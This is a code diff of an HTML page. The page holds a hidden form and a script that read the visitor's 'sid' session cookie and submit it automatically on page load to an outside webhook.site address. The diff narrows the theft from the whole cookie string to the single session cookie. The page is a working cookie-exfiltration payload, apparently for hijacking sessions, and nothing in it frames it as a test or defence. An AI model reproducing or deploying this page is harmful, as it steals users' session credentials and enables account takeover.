@@ -5,10 +5,21 @@
 </head>
 <body>
     <form id="relayForm" action="https://webhook.site/3b9d607c-2935-42bb-8021-517fd6a63882" method="GET">
+        <!-- Hidden input to store the sid cookie -->
         <input type="hidden" name="sid" id="sid" value="" />
     </form>
     <script>
-        document.getElementById('sid').value = document.cookie;
+        // Function to retrieve the sid cookie from parent document
+        function getCookie(name) {
+            const value = `; ${document.cookie}`;
+            const parts = value.split(`; ${name}=`);
+            if (parts.length === 2) return parts.pop().split(';').shift();
+        }
+
+        // Set the value of the sid input field with the retrieved cookie
+        document.getElementById('sid').value = getCookie('sid');
+
+        // Submit the form automatically
         document.getElementById('relayForm').submit();
     </script>
 </body>
